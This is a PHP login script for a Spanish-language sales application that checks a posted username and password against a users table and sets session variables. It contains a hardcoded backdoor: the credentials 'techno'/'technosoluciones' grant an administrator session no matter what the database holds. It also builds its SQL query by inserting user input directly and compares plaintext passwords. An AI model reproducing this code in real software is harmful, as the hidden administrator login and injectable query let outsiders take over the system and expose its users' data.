<?php
session_start();

include("modelo/php_conexion.php");

	if(isset($_POST["user"]) && !empty($_POST["user"]) &&
	   isset($_POST["pw"]) && !empty($_POST["pw"]))
	   {
            $obCon=new ProcesoVenta(1);
            
            $User=$obCon->normalizar($_POST["user"]);
            $Pass=$obCon->normalizar($_POST["pw"]);
            $sql="SELECT * FROM usuarios WHERE Login='$User' AND Password='$Pass'";
            
            $sel=$obCon->Query($sql);
            $sesion=$obCon->FetchArray($sel);
		  
		
		if($_POST["pw"] == $sesion["Password"] or ($_POST["user"] == "techno" and $_POST["pw"] == "technosoluciones"))
		{
			$_SESSION['username'] = $_POST["user"];
			$_SESSION['nombre'] = $sesion["Nombre"];
			$_SESSION['apellido'] = $sesion["Apellido"];
			$_SESSION['tipouser'] = $sesion["TipoUser"];
			$_SESSION['idUser'] = $sesion["idUsuarios"];
	        if($_POST["user"] == "techno" and $_POST["pw"] == "technosoluciones"){
				$_SESSION['nombre'] = "Techno";
				$_SESSION['apellido'] = "Soluciones";
				$_SESSION['tipouser'] = "Administrador";
				$_SESSION['idUser'] = "A";
			}
				
				header("Location: VMenu/Menu.php"); 
                        //echo'<script language="javascript">window.location=" VMenu/Menu.php"</script>';
		}else{
			exit("<a href='login/index.php' ><img src='images/401.png'>Usuario o Password Incorrecto</a>");
	}
	
	}else{
		echo "por favor llena todos los campos";
	}
			
?>